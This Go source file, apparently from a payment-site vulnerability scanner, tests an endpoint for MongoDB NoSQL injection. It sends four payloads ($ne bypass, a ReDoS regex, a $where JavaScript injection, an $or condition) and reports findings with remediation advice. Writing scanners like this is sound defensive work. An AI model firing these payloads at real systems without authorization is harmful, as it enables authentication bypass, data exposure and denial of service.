package scanner

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/SpaceLeam/web-Payment-scanner/internal/models"
	"github.com/SpaceLeam/web-Payment-scanner/internal/utils"
)

// TestNoSQLInjection tests for NoSQL injection vulnerabilities
func TestNoSQLInjection(endpoint models.Endpoint, session *models.Session) []models.Vulnerability {
	vulns := []models.Vulnerability{}
	
	// NoSQL injection payloads (MongoDB)
	nosqlPayloads := []struct{
		name    string
		payload map[string]interface{}
	}{
		{
			"Boolean bypass",
			map[string]interface{}{
				"user_id": map[string]interface{}{"$ne": nil},
				"amount":  100,
			},
		},
		{
			"Regex DoS",
			map[string]interface{}{
				"user_id": map[string]interface{}{"$regex": "(a+)+$"},
				"amount":  100,
			},
		},
		{
			"JavaScript injection",
			map[string]interface{}{
				"user_id": map[string]interface{}{
					"$where": "this.password == 'password' || '1'=='1'",
				},
			},
		},
		{
			"OR condition",
			map[string]interface{}{
				"$or": []interface{}{
					map[string]interface{}{"user_id": "victim"},
					map[string]interface{}{"user_id": map[string]interface{}{"$gt": ""}},
				},
			},
		},
	}
	
	client := utils.NewHTTPClient(15 * time.Second)
	
	for _, nosql := range nosqlPayloads {
		jsonData, _ := json.Marshal(nosql.payload)
		
		req, _ := http.NewRequest("POST", endpoint.URL, bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")
		addAuthHeaders(req, session)
		
		startTime := time.Now()
		resp, err := client.Do(req)
		duration := time.Since(startTime)
		
		if err != nil {
			continue
		}
		
		bodyBytes := make([]byte, 8192)
		n, _ := resp.Body.Read(bodyBytes)
		resp.Body.Close()
		body := string(bodyBytes[:n])
		
		// Detection
		// 1. Regex DoS: if duration > 5s
		if nosql.name == "Regex DoS" && duration > 5*time.Second {
			vulns = append(vulns, models.Vulnerability{
				Type:        "NoSQL Injection",
				Severity:    "HIGH",
				Title:       "NoSQL Regex DoS Vulnerability",
				Description: fmt.Sprintf("Server vulnerable to ReDoS via MongoDB $regex operator. Query took %v.", duration),
				Endpoint:    endpoint.URL,
				Method:      "POST",
				Payload:     string(jsonData),
				Proof:       fmt.Sprintf("Regex payload caused %v delay", duration),
				Timestamp:   time.Now(),
				CWE:         "CWE-1333",
				CVSSScore:   7.5,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
				Confidence:  "High",
				Remediation: `Disable $where and $regex operators in production:

// MongoDB example:
db.payments.find({
    user_id: sanitizedInput // Don't allow $where, $regex from user input
})

// Or use allowlist validation:
if strings.Contains(input, "$where") || strings.Contains(input, "$regex") {
    return errors.New("invalid input")
}`,
				References: []string{
					"https://cwe.mitre.org/data/definitions/1333.html",
					"https://www.mongodb.com/docs/manual/faq/fundamentals/#how-does-mongodb-address-sql-or-query-injection",
				},
			})
		}
		
		// 2. Authentication bypass
		if resp.StatusCode == 200 && (nosql.name == "Boolean bypass" || nosql.name == "OR condition") {
			// If we get sensitive data
			if contains(body, "payment") || contains(body, "user") || contains(body, "success") {
				vulns = append(vulns, models.Vulnerability{
					Type:        "NoSQL Injection",
					Severity:    "CRITICAL",
					Title:       fmt.Sprintf("NoSQL Injection - %s", nosql.name),
					Description: "Server vulnerable to NoSQL injection allowing authentication bypass and unauthorized data access",
					Endpoint:    endpoint.URL,
					Method:      "POST",
					Payload:     string(jsonData),
					Proof:       "Injection payload bypassed authentication and returned sensitive data",
					Timestamp:   time.Now(),
					CWE:         "CWE-943",
					CVSSScore:   9.8,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
					Confidence:  "High",
					Remediation: `Sanitize all user input and use proper query builders:

// Go with MongoDB driver:
filter := bson.D{{"user_id", sanitizedUserID}} // Safe
// NOT: filter := bson.M(userInput) // Dangerous!

// Validation:
func sanitizeMongoInput(input interface{}) error {
    str := fmt.Sprintf("%v", input)
    if strings.Contains(str, "$") {
        return errors.New("invalid character")
    }
    return nil
}`,
					References: []string{
						"https://cwe.mitre.org/data/definitions/943.html",
						"https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html",
					},
				})
			}
		}
	}
	
	return vulns
}
